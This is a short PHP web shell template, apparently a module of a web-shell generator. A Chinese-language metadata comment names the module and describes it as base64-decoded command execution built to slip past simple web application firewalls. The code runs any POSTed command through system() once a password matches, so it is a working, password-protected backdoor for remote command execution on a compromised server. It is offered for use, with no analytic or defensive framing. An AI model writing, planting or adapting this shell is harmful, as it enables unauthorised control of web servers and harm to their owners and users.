// MODULE = {"name": "php_b64", "desc": "PHP 命令执行:base64 解码执行(过简单 WAF;明文命令自动兼容)", "category": "php", "params": [["pass", "连接密码"], ["cmd_param", "命令参数名,默认 cmd"]]}
<?php
if (isset($_POST['{{cmd_param}}']) && isset($_POST['pass']) && $_POST['pass'] === '{{pass}}') {
    $__c = $_POST['{{cmd_param}}'];
    $__d = @base64_decode($__c, true);
    if ($__d === false) { $__d = $__c; }
    @system($__d);
}
?>
